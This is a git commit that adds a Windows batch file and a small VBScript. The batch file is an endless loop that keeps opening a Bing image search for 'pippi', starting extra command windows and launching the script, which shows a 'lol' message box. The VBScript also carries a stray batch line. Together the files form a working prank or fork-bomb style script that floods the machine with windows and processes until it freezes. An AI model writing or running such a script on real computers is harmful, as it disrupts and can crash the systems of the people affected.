be591358742d6683cda0c23a98dffab434fecd30
yourbroF1zzy <fuzzt000@gmail.com>
2024-08-05 19:19:05 +0200

    Add files via upload

---
+++ prabk.bat
@@ -0,0 +1,9 @@
+@echo off
+
+:do
+start https://www.bing.com/images/search?view=detailV2&ccid=IC1H7XFl&id=F09C6AB5B9F369DF16C97FAB8D26B496A67DB9FB&thid=OIP.IC1H7XFl2OrScyakOO8YHAHaEK&mediaurl=https%3a%2f%2fstatic-cdn.sr.se%2fsida%2fimages%2f1602%2f3516963_2048_1152.jpg&cdnurl=https%3a%2f%2fth.bing.com%2fth%2fid%2fR.202d47ed7165d8ead27326a438ef181c%3frik%3d%252b7l9ppa0Jo2rfw%26pid%3dImgRaw%26r%3d0&exph=1152&expw=2048&q=pippi&simid=608001103103272696&FORM=IRPRST&ck=82DC5CCF8F81003D94470B5F9F9BD2EE&selectedIndex=0&itb=0&ajaxhist=0&ajaxserp=0
+start
+start
+start
+start script2
+goto do
---
+++ script2.vbs
@@ -0,0 +1,2 @@
+@echo off
+x=msgbox("lol")
